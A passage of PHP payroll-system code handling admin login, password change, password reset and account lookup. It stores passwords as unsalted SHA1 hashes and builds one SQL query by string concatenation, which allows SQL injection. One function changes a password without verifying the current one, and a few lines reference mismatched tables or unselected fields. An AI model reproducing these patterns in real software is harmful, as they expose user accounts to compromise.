					COALESCE(usr.EmployeeID,0) as EmployeeID,
					COALESCE(usr.EmployeeNumber,'') as EmployeeNumber,
					CONCAT(COALESCE(emp.first_name,''), ' ' ,SUBSTRING(emp.middle_name,1,1) ,'. ' ,COALESCE(emp.last_name,'')) as FullName,

					COALESCE(emp.contact_number,'') as MobileNo,
					COALESCE(emp.email,'') as EmailAddress,

					COALESCE(brnch.ID,0) as BranchID,
					COALESCE(brnch.BranchName,'') as BranchName,

					COALESCE(usr.Username,'') as Username,

					COALESCE(usr.IsSuperAdmin,0) as IsSuperAdmin,


					COALESCE(usr.Status,'') as Status
				")
				->where('usr.Username','=',$Username)
				->where('usr.UserPassword','=',sha1($UserPassword))
				->where('usr.Status','=','Active')
				->get();
		}

		if(count($query) > 0){

			foreach ($query as $ukey){
				
				$IsVerified = true;
				$AdminUserID=$ukey->Username;
				$Username = $ukey->Username;

				$AdminFullName = $ukey->FullName;
				$AdminUserID = $ukey->AdminUserID;

				$AdminBranchID = $ukey->BranchID;
				$AdminBranchName = $ukey->BranchName;

				$IsSuperAdmin = ($ukey->IsSuperAdmin == 1 ? true : false);

			}

			$PayrollPeriod= new PayrollPeriod();
			$payroll_info=$PayrollPeriod->getPayrollPeriodScheduleInfoByCode($PayrollPeriodCode); 

			if(isset($payroll_info)>0){

				$PayrollPeriodScheduleID=$payroll_info->ID;
				$PayrollPeriodScheduleCode=$payroll_info->Code;
				$PayrollPeriodScheduleStart= date('m/d/Y', strtotime($payroll_info->StartDate ));
				$PayrollPeriodScheduleEnd= date('m/d/Y', strtotime($payroll_info->EndDate ));
				$PayrollPeriodSchedule= date('m/d/Y', strtotime($payroll_info->StartDate )).' -  '. date('m/d/Y', strtotime($payroll_info->EndDate ));
				$PayrollPeriodScheduleYear=$payroll_info->Year;
			}

			Session::put('ADMIN_LOGGED_IN', $IsVerified);
			Session::put('ADMIN_USER_ID', $AdminUserID); 
			Session::put('ADMIN_USERNAME', $Username);

			Session::put('ADMIN_FULL_NAME', $AdminFullName);

			Session::put('IS_SUPER_ADMIN', $IsSuperAdmin);

			Session::put('ADMIN_BRANCH_ID', $AdminBranchID); 
			Session::put('ADMIN_BRANCH_NAME', $AdminBranchName); 

			Session::put('ADMIN_PAYROLL_PERIOD_SCHED_ID', $PayrollPeriodScheduleID);
			Session::put('ADMIN_PAYROLL_PERIOD_SCHED', $PayrollPeriodSchedule);
			Session::put('ADMIN_PAYROLL_PERIOD_SCHED_CODE', $PayrollPeriodScheduleCode);
			Session::put('ADMIN_PAYROLL_PERIOD_SCHED_START', $PayrollPeriodScheduleStart);
			Session::put('ADMIN_PAYROLL_PERIOD_SCHED_END', $PayrollPeriodScheduleEnd);
			Session::put('ADMIN_PAYROLL_PERIOD_SCHED_YEAR', $PayrollPeriodScheduleYear);

		}else{
		    
			$IsVerified=false;
		}
		
		return $IsVerified;
	}

  public function doAdminChangePassword($data){

      	$TODAY = date("Y-m-d H:i:s");

      	$AdminUserID = $data['AdminUserID'];
      	$CurrentPassword = $data['CurrentPassword'];
      	$NewPassword = $data['NewPassword'];

      	$Sha1CurrentPassword=sha1(trim($data['CurrentPassword']));
      	$Sha1NewPassword=sha1(trim($data['NewPassword']));

        $strSQL = "SELECT
        		AdminUserID
        		FROM payroll_admin_users
        		WHERE AdminUserID = ".$AdminUserID."
        		AND UserPassword = '".$Sha1CurrentPassword."'";

  		  $list = DB::select($strSQL);

	      if(count($list) > 0){
		        	DB::table('payroll_admin_users')
	            ->where('AdminUserID',$AdminUserID)
	            ->update([
	        		'UserPassword' => $Sha1NewPassword
	        ]);

	        //Save Transaction Log
	        $Misc = new Misc();
	        $logData['TransRefID'] = $AdminUserID;
	        $logData['TransactedByID'] = Session('ADMIN_USER_ID');
	        $logData['ModuleType'] = "Admin User";
	        $logData['TransType'] = "Change Admin Password";
	        $logData['Remarks'] = "";
	        $Misc->doSaveTransactionLog($logData);

		return 'Success';
		}

		return 'Sorry. The system is unable to verify your current password.';

    }

    public function doAdminRequestForChangePassword($data){

      	$TODAY = date("Y-m-d H:i:s");

      	$AdminUserID = $data['AdminUserID'];
      	$NewPassword = $data['NewPassword'];

      	$Sha1NewPassword=sha1(trim($data['NewPassword']));
		        	
		 DB::table('payroll_admin_users')
		->where('AdminUserID',$AdminUserID)
		->update([
			'UserPassword' => $Sha1NewPassword
		]);

        //Save Transaction Log
        $Misc = new Misc();
        $logData['TransRefID'] = $AdminUserID;
        $logData['TransactedByID'] = Session('ADMIN_USER_ID');
        $logData['ModuleType'] = "Admin User";
        $logData['TransType'] = "Request for Change Admin Password";
        $logData['Remarks'] = "";
        $Misc->doSaveTransactionLog($logData);

		return 'Success';
		
    }

    public function doAdminResetPassword($data){

	    $TODAY = date("Y-m-d H:i:s");
        $Misc = new Misc();

	    $AdminUserID = $data['AdminUserID'];
    	$GeneratedTempPassword = $Misc->GenerateRandomNo(6,'','');

		if($AdminUserID > 0){
      		DB::table('admin_users')
	            ->where('AdminUserID',$AdminUserID)
	            ->update([
	        		'UserPassword' => sha1(trim($GeneratedTempPassword))
	        	]);

	        //Save Transaction Log
	        $logData['TransRefID'] = $AdminUserID;
	        $logData['TransactedByID'] = NULL;
	        $logData['ModuleType'] = "Admin User";
	        $logData['TransType'] = "Forgot Admin Password";
	        $logData['Remarks'] = "";
	        $Misc->doSaveTransactionLog($logData);
    	}

    	return 'Success';

  	}

public function checkUserAccountIfExist($param){

    $IsExist = false;
    $PersonnelID=$param['PersonnelID'];

    $AdminList= DB::table('payroll_admin_users as pau')
        ->where('pau.EmployeeID','=',$PersonnelID)
        ->where('pau.Status','=','Active')
        ->get();

    if(count($AdminList)>0){	
        $IsExist = true;
    }

      return $IsExist;
    }

}

